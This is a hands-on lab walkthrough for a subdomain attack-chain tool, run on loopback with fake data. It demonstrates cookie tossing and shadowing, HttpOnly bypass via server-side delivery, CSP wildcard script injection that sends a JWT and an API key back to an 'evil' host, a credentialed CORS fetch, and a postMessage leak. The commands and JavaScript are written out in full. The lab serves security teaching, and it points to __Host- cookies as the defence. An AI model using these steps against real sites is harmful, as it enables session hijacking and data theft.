# Lab walkthrough: live the subdomain chain in your own browser

This lab gives you the exact position described in the README: you control
`evil.localtest.me` while the victim organization runs `app.localtest.me` and
`victim2.localtest.me`. Everything runs on your loopback (`*.localtest.me` is
public DNS for 127.0.0.1), all data is fake, and every result below was
verified in Chromium.

Requirements: Python 3.8+ (stdlib only) and any modern browser.

## 1. Start the lab

```sh
python3 lab/server.py
```

Keep it running. Open the victim dashboard:
<http://app.localtest.me:8901/?cb=0>

Open DevTools, Application, Cookies. You should see three cookies:

- `session=appsecret` with `Domain=.localtest.me` and **HttpOnly**
- `strictck=1` with `Domain=.localtest.me` and **SameSite=Strict**
- `csrftoken=csrf-9f3a1` with no Domain attribute (host-only)

Also note the JWT the app parked in localStorage (Application, Local Storage).

## 2. Audit the lab with the tool

From the repository root:

```sh
python3 subchain.py recon --domain localtest.me \
    --controlled evil.localtest.me --list lab/hosts.txt
```

The report should label `session` and `strictck` as **RECEIVABLE / TOSSABLE**,
`csrftoken` as **HOST-ONLY (shadowable)**, and flag the app as **FRAMABLE**.
You are about to verify every one of those labels by hand.

## 3. The HttpOnly lesson: what the browser tells you vs what it sends

Open the attacker console: <http://evil.localtest.me:8901/>

- Card 1 runs `document.cookie` on evil: `session` is **missing** (HttpOnly).
- Card 2 shows what your browser actually **sent** to this server when you
  opened the page: `session=appsecret` is there, HttpOnly or not, and so is
  `strictck=1` despite SameSite=Strict (same site, one eTLD+1).

That is cookie confidentiality in this position: the attacker does not need
JavaScript access to the cookie, the browser delivers it server-side.

## 4. Toss, shadow, and the one thing that fails

Still on the console, press the buttons one by one:

- **TOSS session=FIXATED**, then open
  <http://app.localtest.me:8901/whoami> and reload:
  `session=FIXATED`. Your subdomain replaced the app's session cookie for the
  whole family.
- **SHADOW csrftoken**, reload `/whoami` again: the header now carries both
  `csrftoken=csrf-9f3a1; csrftoken=EVILSHADOW`. A server-side parser reading
  first or last gets one of yours.
- **TRY __Host-**, then check DevTools cookies on evil: nothing was stored.
  The browser rejected a `__Host-` cookie delivered with a `Domain`
  attribute. That rejection is what a hardened target looks like.

## 5. CSP trust: script execution inside the app origin

Back on the app dashboard, switch CSP variants with the links at the top and
watch the console:

- <http://app.localtest.me:8901/?cb=1> (`script-src *.localtest.me`) and
  `?cb=2` (`http://*.localtest.me`): the browser **blocks**
  `http://evil.localtest.me:8901/script.js`. Without a port part, a CSP
  host-source matches only the scheme's default ports; the lab runs on :8901.
- `?cb=3` (`*.localtest.me:8901`), `?cb=4` (exact host) and `?cb=5`
  (`http://*.localtest.me:*`): the script **executes inside the app origin**.

After a successful variant, return to the console: card 3 shows what the
script collected and beamed back, including the localStorage JWT, the DOM PII
and the same-origin profile API response with its API key. On port 443 the
port distinction disappears, which is exactly why `*.victim.com` in a real
CSP is a live chain.

## 6. CORS with credentials (optional, needs the console)

On the attacker console, run in DevTools:

```js
fetch('http://app.localtest.me:8901/api', {credentials: 'include'})
  .then(r => r.text()).then(console.log)
```

The app reflects any origin with credentials, so your evil origin reads the
authenticated response cross-origin.

## 7. Framing + postMessage

The console's card 4 embeds `victim2.localtest.me` (no X-Frame-Options) and
has a **send message** button. Press it: the naive listener replies with its
secret to any sender, and the reply lands in your log. On a real engagement
this is where you enumerate `postMessage` handlers.

## 8. Swap in the tool's own capture server (optional)

The console you have been using is the lab's. The tool ships the same idea:

```sh
python3 subchain.py serve --domain localtest.me --port 8902 --out captured.jsonl
curl -H "Cookie: session=appsecret" http://127.0.0.1:8902/
cat captured.jsonl
curl "http://127.0.0.1:8902/toss?name=session&value=FIXATED"
```

## What you just proved

| Claim | Where you saw it |
|---|---|
| HttpOnly does not stop delivery | console card 2 vs card 1 |
| SameSite=Strict is same-site here | strictck in the captured request |
| Domain cookies are tossable | session=FIXATED on /whoami |
| Host-only cookies are shadowable | double csrftoken on /whoami |
| `__Host-` is the real defense | rejected cookie on TRY __Host- |
| CSP wildcard trusts your host (port rule) | variant matrix in step 5 |
| CSP trust becomes data exfiltration | console card 3 after variant 3 |
| postMessage leaks across siblings | console card 4 |
